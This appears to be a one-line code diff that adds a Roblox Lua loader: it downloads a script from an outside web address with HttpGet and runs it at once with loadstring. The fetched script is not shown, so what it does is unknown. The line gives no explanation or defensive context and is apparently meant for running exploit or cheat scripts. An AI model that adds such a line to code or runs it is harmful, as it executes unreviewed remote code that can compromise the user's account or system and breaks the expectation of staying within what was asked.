@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://thekillerhood.xyz/trading/popitscript.txt"), true))()
